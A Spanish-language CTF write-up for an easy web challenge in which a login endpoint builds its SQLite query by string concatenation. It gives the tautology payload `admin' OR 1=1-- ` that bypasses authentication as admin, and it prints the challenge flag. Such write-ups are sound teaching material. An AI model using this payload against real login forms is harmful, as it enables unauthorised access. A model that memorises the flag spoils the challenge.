# 📋 Writeup Oficial: Inyección Clásica

| Campo | Detalle |
| :--- | :--- |
| **Categoría** | Web / SQL Injection |
| **Dificultad** | Fácil (Easy) |
| **Puntos** | 300 |
| **Flag** | `CHRONOS{sqli_bypass_tautology_login_6406}` |

---

## 1. Análisis de la Vulnerabilidad

El endpoint `POST /login` construye la consulta SQL de autenticación concatenando directamente los parámetros `username` y `password`:

```sql
SELECT id, username, display_name, role FROM users
WHERE username = '<username>' AND password = '<password>'
```

Al no utilizar sentencias preparadas (consultas parametrizadas), el campo `username` permite inyectar sintaxis SQL arbitraria para alterar la lógica booleana de la condición.

---

## 2. Explotación (Bypass de Autenticación)

Para autenticarse como administrador sin conocer la contraseña, se inyecta una tautología clásica (condición siempre verdadera):

* **Usuario:** `admin' OR 1=1-- `
* **Contraseña:** Cualquier valor (ej. `x`)

La consulta evaluada por el motor de base de datos SQLite se convierte en:

```sql
SELECT id, username, display_name, role FROM users
WHERE username = 'admin' OR 1=1-- ' AND password = 'x'
```

El token `-- ` en SQLite comenta e ignora la validación de contraseña. Dado que `1=1` siempre es verdadero y el registro `admin` coincide con la primera fila retornada, la sesión es asignada con rol `admin`.

Al acceder al panel (`/dashboard`), se muestra la bandera:

```text
CHRONOS{sqli_bypass_tautology_login_6406}
```
